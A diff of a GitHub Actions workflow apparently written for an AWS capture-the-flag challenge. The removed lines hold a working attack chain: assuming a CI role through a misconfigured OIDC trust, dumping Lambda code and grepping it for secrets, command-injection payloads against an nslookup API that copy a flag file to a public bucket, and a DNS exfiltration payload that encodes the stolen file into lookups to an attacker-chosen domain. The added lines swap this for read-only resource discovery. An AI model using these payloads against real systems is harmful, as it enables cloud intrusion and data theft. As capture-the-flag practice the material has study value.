@@ -1,16 +1,7 @@
-name: have-some-faith
+name: CTF AWS Discovery
 
 on:
   workflow_dispatch:
-    inputs:
-      api_url:
-        description: "Exact challenge API URL from the provided site, for example https://.../stage/path"
-        required: false
-        type: string
-      exfil_domain:
-        description: "Optional domain you control for DNS exfil, for blind command output only"
-        required: false
-        type: string
   push:
     branches:
       - corgi
@@ -19,239 +10,127 @@ permissions:
   id-token: write
   contents: read
 
-env:
-  AWS_REGION: us-east-1
-  TARGET_ROLE_ARN: arn:aws:iam::009661764077:role/cicdRole
-  CHALLENGE_API_URL: https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup
-
 jobs:
-  enumerate:
+  discover:
     runs-on: ubuntu-latest
+
     steps:
-      - name: Configure AWS credentials through vulnerable OIDC trust
+      - name: Configure AWS credentials
         uses: aws-actions/configure-aws-credentials@v4
         with:
-          role-to-assume: ${{ env.TARGET_ROLE_ARN }}
-          role-session-name: have-some-faith
-          aws-region: ${{ env.AWS_REGION }}
+          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
+          aws-region: us-east-1
+          role-session-name: ctf-discovery
 
-      - name: Confirm identity
-        run: aws sts get-caller-identity
+      - name: Verify identity
+        run: |
+          set -euo pipefail
+          aws sts get-caller-identity
 
-      - name: Enumerate S3 and Lambda
+      - name: Discover frontend and API endpoints
         shell: bash
         run: |
           set -euo pipefail
 
-          mkdir -p out/lambda
+          mkdir -p discovery
 
-          echo "== Buckets =="
-          aws s3api list-buckets --query 'Buckets[].Name' --output text || true
+          echo "=== CloudFront distributions ==="
+          aws cloudfront list-distributions \
+            --query 'DistributionList.Items[].{
+              Id:Id,
+              DomainName:DomainName,
+              Status:Status,
+              Enabled:Enabled,
+              Origins:Origins.Items[].DomainName
+            }' \
+            --output json | tee discovery/cloudfront.json
 
-          for bucket in codec4f26c862a321ef5 platform-bucket-009661764077-us-east-1 site781fe43f26b9eba3; do
-            echo "== Bucket policy: $bucket =="
-            aws s3api get-bucket-policy --bucket "$bucket" --query Policy --output text || true
+          echo
+          echo "=== API Gateway REST APIs ==="
+          aws apigateway get-rest-apis \
+            --query 'items[].{Id:id,Name:name,Description:description}' \
+            --output json | tee discovery/api-gateway-rest.json
 
-            echo "== Bucket policy status: $bucket =="
-            aws s3api get-bucket-policy-status --bucket "$bucket" --output json || true
+          echo
+          echo "=== API Gateway HTTP/WebSocket APIs ==="
+          aws apigatewayv2 get-apis \
+            --query 'Items[].{
+              ApiId:ApiId,
+              Name:Name,
+              ProtocolType:ProtocolType,
+              ApiEndpoint:ApiEndpoint
+            }' \
+            --output json | tee discovery/api-gateway-v2.json
 
-            echo "== Bucket objects: $bucket =="
-            aws s3api list-objects-v2 --bucket "$bucket" \
-              --query 'Contents[].{Key:Key,Size:Size,LastModified:LastModified}' \
-              --output table || true
-          done
+          echo
+          echo "=== S3 buckets ==="
+          aws s3api list-buckets \
+            --query 'Buckets[].Name' \
+            --output json | tee discovery/s3-buckets.json
 
-          echo "== Functions =="
+          echo
+          echo "=== Lambda functions ==="
           aws lambda list-functions \
-            --query 'Functions[].{Name:FunctionName,Runtime:Runtime,Handler:Handler,Role:Role,LastModified:LastModified,Env:Environment.Variables}' \
-            --output json
+            --query 'Functions[].{
+              FunctionName:FunctionName,
+              Runtime:Runtime,
+              Description:Description
+            }' \
+            --output json | tee discovery/lambda-functions.json
 
-          aws lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' |
-          while read -r fn; do
-            test -n "$fn" || continue
-            echo "== Inspecting Lambda: $fn =="
+          echo
+          echo "=== Candidate frontend URLs ==="
 
-            echo "== Lambda resource policy: $fn =="
-            aws lambda get-policy --function-name "$fn" --output json || true
-
-            echo "== Lambda configuration: $fn =="
-            aws lambda get-function-configuration --function-name "$fn" --output json > "out/lambda/$fn.config.json" || true
-            cat "out/lambda/$fn.config.json" || true
-
-            code_url="$(aws lambda get-function --function-name "$fn" --query 'Code.Location' --output text || true)"
-            if [[ "$code_url" != "None" && -n "$code_url" ]]; then
-              curl -fsSL "$code_url" -o "out/lambda/$fn.zip" || true
-              unzip -q -o "out/lambda/$fn.zip" -d "out/lambda/$fn" || true
-              echo "== Lambda package files: $fn =="
-              find "out/lambda/$fn" -maxdepth 4 -type f -print || true
-            fi
-          done
-
-          echo "== Flag grep =="
-          grep -RInaE 'flag|ctf|HTB|THM|pico|faith|secret|password|token|key' out || true
-
-      - name: Enumerate public front doors
-        shell: bash
-        run: |
-          set -euo pipefail
-
-          echo "== CloudFront distributions =="
-          aws cloudfront list-distributions --output json || true
-
-          echo "== API Gateway v1 APIs =="
-          aws apigateway get-rest-apis --output json || true
-
-          echo "== API Gateway v2 APIs =="
-          aws apigatewayv2 get-apis --output json || true
-
-          echo "== Lambda function URL config =="
-          aws lambda get-function-url-config --function-name nslookupv2 --output json || true
-
-      - name: Scoped exploit using only the challenge front door
-        shell: bash
-        run: |
-          set -euo pipefail
-
-          site_base="https://d67nf28gqfurd.cloudfront.net"
-          public_bucket="platform-bucket-009661764077-us-east-1"
-          flag_bucket="codec4f26c862a321ef5"
-          out_key="faith-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}.txt"
-          exfil_url="s3://${public_bucket}/${out_key}"
-          command="example.com; /opt/aws s3 cp s3://${flag_bucket}/flag.txt ${exfil_url}; #"
-          sleep_command="example.com; sleep 6; #"
-
-          echo "== Read provided challenge site for API route =="
-          curl -ksS -m 10 "${site_base}/index.html" -o out/site-index.html || true
-          curl -ksS -m 10 "${site_base}/js/scripts.js" -o out/site-scripts.js || true
-          grep -RInaE 'execute-api|3q931syi7b|fetch|XMLHttpRequest|axios|domain|lookup|nslookup|api' out/site-* || true
-
-          input_url="${{ github.event.inputs.api_url }}"
-          discovered_url="$(grep -RaoE 'https://3q931syi7b\.execute-api\.us-east-1\.amazonaws\.com[^"'"'"'` )]+' out/site-* 2>/dev/null | head -n 1 || true)"
-          api_url="${input_url:-${discovered_url:-$CHALLENGE_API_URL}}"
-
-          if [[ -z "$api_url" ]]; then
-            echo "No exact API URL discovered. Open ${site_base}/js/scripts.js from an Israeli IP and rerun workflow_dispatch with api_url."
-            exit 1
-          fi
-
-          echo "== Using API URL: $api_url =="
-
-          echo "== Direct flag read as cicdRole, expected to fail unless object ACL allows it =="
-          aws s3 cp "s3://${flag_bucket}/flag.txt" - || true
-
-          check_flag() {
-            if aws s3api head-object --bucket "$public_bucket" --key "$out_key" >/dev/null 2>&1; then
-              echo "== Exfil succeeded: s3://${public_bucket}/${out_key} =="
-              aws s3 cp "s3://${public_bucket}/${out_key}" -
-              return 0
-            fi
-            return 1
-          }
-
-          echo "== Timing test for command injection =="
-          python3 - "$api_url" "$sleep_command" <<'PY'
+          python - <<'PY'
           import json
-          import sys
-          import time
-          import urllib.request
+          from pathlib import Path
 
-          url, domain = sys.argv[1], sys.argv[2]
-          body = json.dumps({"domain": domain}).encode()
-          req = urllib.request.Request(url, data=body, headers={"content-type": "application/json"}, method="POST")
-          start = time.time()
-          try:
-              with urllib.request.urlopen(req, timeout=12) as resp:
-                  print(resp.read().decode("utf-8", "replace"))
-          except Exception as exc:
-              print(f"request error: {exc}")
-          elapsed = time.time() - start
-          print(f"elapsed_seconds={elapsed:.2f}")
+          cloudfront = json.loads(
+              Path("discovery/cloudfront.json").read_text()
+          )
+
+          for item in cloudfront:
+              domain = item.get("DomainName")
+              if domain:
+                  print(f"https://{domain}")
+
+          apis = json.loads(
+              Path("discovery/api-gateway-v2.json").read_text()
+          )
+
+          for item in apis:
+              endpoint = item.get("ApiEndpoint")
+              if endpoint:
+                  print(endpoint)
           PY
 
-          echo "== Calling exact challenge API URL with S3 copy attempt =="
-          curl -ksS -m 10 -X POST \
-            -H 'content-type: application/json' \
-            --data "{\"domain\":\"${command}\"}" \
-            "$api_url" || true
-          echo
-
-          if check_flag; then
-            exit 0
-          fi
-
-          echo "== Exfil object not found after scoped S3 copy attempt =="
-          aws s3api list-objects-v2 --bucket "$public_bucket" \
-            --query 'Contents[].{Key:Key,Size:Size,LastModified:LastModified}' \
-            --output table || true
-
-          exfil_domain="${{ github.event.inputs.exfil_domain }}"
-          if [[ -n "$exfil_domain" ]]; then
-            echo "== DNS exfil using participant-provided domain: $exfil_domain =="
-            dns_command="example.com; v=\$(/opt/aws s3 cp s3://${flag_bucket}/flag.txt - 2>/dev/null | base64 | tr -d '=+/\\n' | tr '[:upper:]' '[:lower:]'); /opt/nslookup \${v}.${exfil_domain}; #"
-            curl -ksS -m 10 -X POST \
-              -H 'content-type: application/json' \
-              --data "{\"domain\":\"${dns_command}\"}" \
-              "$api_url" || true
-            echo
-            echo "Check authoritative DNS logs for a query ending in .$exfil_domain"
-          else
-            echo "No DNS exfil domain provided. If timing confirms injection and S3 copy fails, rerun with exfil_domain set to an authorized domain you control."
-          fi
-          exit 1
-
-      - name: Probe command injection
+      - name: Inspect S3 bucket metadata
         shell: bash
         run: |
           set -euo pipefail
 
-          invoke() {
-            local label="$1"
-            local payload="$2"
-            echo "== Invoke: $label =="
-            aws lambda invoke \
-              --function-name nslookupv2 \
-              --cli-binary-format raw-in-base64-out \
-              --payload "$payload" \
-              "out/${label}.response.json" || true
-            cat "out/${label}.response.json" || true
-            echo
-          }
+          while read -r bucket; do
+            [ -z "$bucket" ] && continue
 
-          mkdir -p out
+            echo "=== Bucket: $bucket ==="
 
-          invoke "id" '{"domain":"example.com; id; #"}'
-          invoke "caller" '{"domain":"example.com; /opt/aws sts get-caller-identity; aws sts get-caller-identity; python -m awscli sts get-caller-identity; #"}'
-          invoke "s3ls" '{"domain":"example.com; /opt/aws s3 ls; aws s3 ls; python -m awscli s3 ls; #"}'
-          invoke "findflag" '{"domain":"example.com; /opt/aws s3 ls s3://platform-bucket-009661764077-us-east-1 --recursive; /opt/aws s3 ls s3://codec4f26c862a321ef5 --recursive; /opt/aws s3 ls s3://site781fe43f26b9eba3 --recursive; #"}'
+            aws s3api get-bucket-location \
+              --bucket "$bucket" \
+              --output json || true
 
-      - name: Try CloudWatch log read
-        shell: bash
-        run: |
-          set -euo pipefail
+            aws s3api get-bucket-policy-status \
+              --bucket "$bucket" \
+              --output json || true
 
-          log_group="/aws/lambda/nslookupv2"
-          echo "== Log streams =="
-          aws logs describe-log-streams \
-            --log-group-name "$log_group" \
-            --order-by LastEventTime \
-            --descending \
-            --max-items 5 \
-            --output json || true
+            aws s3api get-bucket-policy \
+              --bucket "$bucket" \
+              --output json || true
+          done < <(
+            jq -r '.[]' discovery/s3-buckets.json
+          )
 
-          stream="$(aws logs describe-log-streams \
-            --log-group-name "$log_group" \
-            --order-by LastEventTime \
-            --descending \
-            --max-items 1 \
-            --query 'logStreams[0].logStreamName' \
-            --output text 2>/dev/null || true)"
-
-          if [[ "$stream" != "None" && -n "$stream" ]]; then
-            echo "== Recent log events from $stream =="
-            aws logs get-log-events \
-              --log-group-name "$log_group" \
-              --log-stream-name "$stream" \
-              --limit 100 \
-              --query 'events[].message' \
-              --output text || true
-          fi
+      - name: Upload discovery results
+        uses: actions/upload-artifact@v4
+        with:
+          name: aws-discovery-results
+          path: discovery/
